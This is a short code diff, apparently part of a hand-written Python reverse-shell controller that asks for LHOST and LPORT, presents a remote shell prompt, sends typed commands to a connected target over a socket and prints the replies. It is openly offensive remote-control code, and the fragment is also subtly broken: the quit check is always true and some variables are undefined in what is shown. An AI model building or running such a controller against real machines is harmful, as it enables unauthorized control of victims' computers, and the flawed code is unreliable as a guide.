@@ -1,8 +1,29 @@
 import socket
+import json
+
+def reliable_send(data):
+    jsondata = json.dumps(data)
+    target.send(jsondata.encode())
+
+def reliable_recv():
+    data = ''
+    while True:
+        try:
+            data = data + target.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
 
 def target_communication():
     while True:
         command = input('* Shell~%s:' % str(ip))
+        reliable_send(command)
+        if command == 'quit'or 'q':
+            break
+        else:
+            result = reliable_recv()
+            print(result)
+
 
 LHOST = input('what\'s your LHOST? ')
 LPORT = input('what\'s your LPORT? ')
